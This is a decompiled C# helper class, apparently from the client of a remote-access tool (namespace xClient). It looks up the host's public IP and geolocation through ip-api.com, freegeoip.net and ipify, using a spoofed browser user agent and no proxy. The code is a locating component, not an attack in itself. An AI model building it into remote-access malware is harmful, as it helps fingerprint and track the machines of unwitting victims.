using System;
using System.IO;
using System.Net;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Xml;
using xClient.Core.Data;

namespace xClient.Core.Helper;

public static class GeoLocationHelper
{
	public static readonly string[] ImageList;

	public static int ImageIndex { get; set; }

	public static GeoInformation GeoInfo { get; private set; }

	public static DateTime LastLocated { get; private set; }

	public static bool LocationCompleted { get; private set; }

	static GeoLocationHelper()
	{
		ImageList = new string[247]
		{
			"ad", "ae", "af", "ag", "ai", "al", "am", "an", "ao", "ar",
			"as", "at", "au", "aw", "ax", "az", "ba", "bb", "bd", "be",
			"bf", "bg", "bh", "bi", "bj", "bm", "bn", "bo", "br", "bs",
			"bt", "bv", "bw", "by", "bz", "ca", "catalonia", "cc", "cd", "cf",
			"cg", "ch", "ci", "ck", "cl", "cm", "cn", "co", "cr", "cs",
			"cu", "cv", "cx", "cy", "cz", "de", "dj", "dk", "dm", "do",
			"dz", "ec", "ee", "eg", "eh", "england", "er", "es", "et", "europeanunion",
			"fam", "fi", "fj", "fk", "fm", "fo", "fr", "ga", "gb", "gd",
			"ge", "gf", "gh", "gi", "gl", "gm", "gn", "gp", "gq", "gr",
			"gs", "gt", "gu", "gw", "gy", "hk", "hm", "hn", "hr", "ht",
			"hu", "id", "ie", "il", "in", "io", "iq", "ir", "is", "it",
			"jm", "jo", "jp", "ke", "kg", "kh", "ki", "km", "kn", "kp",
			"kr", "kw", "ky", "kz", "la", "lb", "lc", "li", "lk", "lr",
			"ls", "lt", "lu", "lv", "ly", "ma", "mc", "md", "me", "mg",
			"mh", "mk", "ml", "mm", "mn", "mo", "mp", "mq", "mr", "ms",
			"mt", "mu", "mv", "mw", "mx", "my", "mz", "na", "nc", "ne",
			"nf", "ng", "ni", "nl", "no", "np", "nr", "nu", "nz", "om",
			"pa", "pe", "pf", "pg", "ph", "pk", "pl", "pm", "pn", "pr",
			"ps", "pt", "pw", "py", "qa", "re", "ro", "rs", "ru", "rw",
			"sa", "sb", "sc", "scotland", "sd", "se", "sg", "sh", "si", "sj",
			"sk", "sl", "sm", "sn", "so", "sr", "st", "sv", "sy", "sz",
			"tc", "td", "tf", "tg", "th", "tj", "tk", "tl", "tm", "tn",
			"to", "tr", "tt", "tv", "tw", "tz", "ua", "ug", "um", "us",
			"uy", "uz", "va", "vc", "ve", "vg", "vi", "vn", "vu", "wales",
			"wf", "ws", "ye", "yt", "za", "zm", "zw"
		};
		LastLocated = new DateTime(1, 1, 1, 0, 0, 0, DateTimeKind.Utc);
	}

	public static void Initialize()
	{
		TimeSpan timeSpan = new TimeSpan(DateTime.UtcNow.Ticks - LastLocated.Ticks);
		if (!(timeSpan.TotalMinutes > 30.0) && LocationCompleted)
		{
			return;
		}
		TryLocate();
		if (!string.IsNullOrEmpty(GeoInfo.CountryCode) && !string.IsNullOrEmpty(GeoInfo.Country))
		{
			int num = 0;
			while (true)
			{
				if (num < ImageList.Length)
				{
					if (ImageList[num] == GeoInfo.CountryCode.ToLower())
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			ImageIndex = num;
		}
		else
		{
			ImageIndex = 247;
		}
	}

	private static void TryLocate()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		LocationCompleted = false;
		try
		{
			DataContractJsonSerializer val = new DataContractJsonSerializer(typeof(GeoInformation));
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
			obj.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
			obj.Proxy = null;
			obj.Timeout = 10000;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse())
			{
				using Stream stream = httpWebResponse.GetResponseStream();
				using StreamReader streamReader = new StreamReader(stream);
				string s = streamReader.ReadToEnd();
				using MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(s));
				GeoInfo = (GeoInformation)((XmlObjectSerializer)val).ReadObject((Stream)memoryStream);
			}
			LastLocated = DateTime.UtcNow;
			LocationCompleted = true;
		}
		catch
		{
			TryLocateFallback();
		}
	}

	private static void TryLocateFallback()
	{
		GeoInfo = new GeoInformation();
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("http://freegeoip.net/xml/");
			obj.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
			obj.Proxy = null;
			obj.Timeout = 10000;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse())
			{
				using Stream stream = httpWebResponse.GetResponseStream();
				using StreamReader streamReader = new StreamReader(stream);
				string xml = streamReader.ReadToEnd();
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(xml);
				string innerXml = xmlDocument.SelectSingleNode("Response//IP")!.InnerXml;
				string innerXml2 = xmlDocument.SelectSingleNode("Response//CountryName")!.InnerXml;
				string innerXml3 = xmlDocument.SelectSingleNode("Response//CountryCode")!.InnerXml;
				string innerXml4 = xmlDocument.SelectSingleNode("Response//RegionName")!.InnerXml;
				string innerXml5 = xmlDocument.SelectSingleNode("Response//City")!.InnerXml;
				string innerXml6 = xmlDocument.SelectSingleNode("Response//TimeZone")!.InnerXml;
				GeoInfo.Ip = ((!string.IsNullOrEmpty(innerXml)) ? innerXml : "-");
				GeoInfo.Country = ((!string.IsNullOrEmpty(innerXml2)) ? innerXml2 : "Unknown");
				GeoInfo.CountryCode = ((!string.IsNullOrEmpty(innerXml3)) ? innerXml3 : "-");
				GeoInfo.Region = ((!string.IsNullOrEmpty(innerXml4)) ? innerXml4 : "Unknown");
				GeoInfo.City = ((!string.IsNullOrEmpty(innerXml5)) ? innerXml5 : "Unknown");
				GeoInfo.Timezone = ((!string.IsNullOrEmpty(innerXml6)) ? innerXml6 : "Unknown");
				GeoInfo.Isp = "Unknown";
			}
			LastLocated = DateTime.UtcNow;
			LocationCompleted = true;
		}
		catch
		{
			GeoInfo.Country = "Unknown";
			GeoInfo.CountryCode = "-";
			GeoInfo.Region = "Unknown";
			GeoInfo.City = "Unknown";
			GeoInfo.Timezone = "Unknown";
			GeoInfo.Isp = "Unknown";
			LocationCompleted = false;
		}
		if (string.IsNullOrEmpty(GeoInfo.Ip))
		{
			TryGetWanIp();
		}
	}

	private static void TryGetWanIp()
	{
		string ip = "-";
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("http://api.ipify.org/");
			obj.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
			obj.Proxy = null;
			obj.Timeout = 5000;
			using HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			using Stream stream = httpWebResponse.GetResponseStream();
			using StreamReader streamReader = new StreamReader(stream);
			ip = streamReader.ReadToEnd();
		}
		catch (Exception)
		{
		}
		GeoInfo.Ip = ip;
	}
}
